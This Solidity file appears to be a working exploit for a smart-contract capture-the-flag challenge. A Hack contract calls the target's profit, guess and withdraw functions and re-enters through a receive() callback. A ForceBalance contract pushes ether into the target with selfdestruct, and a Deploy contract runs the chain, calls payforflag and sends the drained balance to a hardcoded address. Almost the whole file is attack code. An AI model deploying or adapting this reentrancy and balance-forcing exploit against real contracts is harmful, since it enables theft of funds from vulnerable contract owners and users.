pragma solidity ^0.8.11;


//import "console.sol";


contract Hack {
    address target;
    uint secret;
    bool callback = false;

    constructor(address _target, uint _secret) {
        target = _target;
        secret = _secret;

    }

    function run() public{
        bool success;
        bytes memory result;

        //console.log("1");
        (success, result) = target.call(abi.encodeWithSignature("profit()"));
        require(success);

        //console.log("2");
        (success, result) = target.call(abi.encodeWithSignature("guess(uint256)", secret));
        require(success);

        //console.log("3");
        (success, result) = target.call(abi.encodeWithSignature("withdraw(uint256)", 0x2));
        require(success);

        //console.log("4");
        (success, result) = target.call(abi.encodeWithSignature("payforflag(string,string)", "werew", "werew"));
        require(success);
        //console.log("END");

        //console.log(address(this).balance);
        payable(address(0x2A5c1AEa0F3bdB383C2de2f250b51083e274aa13)).transfer(address(this).balance);

        //console.log("Returned balance");

    }

    receive() external payable {
        bool success;
        bytes memory result;

        //console.log("receive");
        (success, result) = target.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender,0x2));
        require(success);
    }
}

contract ForceBalance{
    constructor(address payable target) payable{
        //console.log("ForceBalance");
        selfdestruct(target);
    }
}

contract Deploy {
    constructor(address _target, uint _secret) payable {
        Hack h = new Hack(_target, _secret);
        ForceBalance f = new ForceBalance{value: address(this).balance}(payable(_target));
        h.run();
    }
}


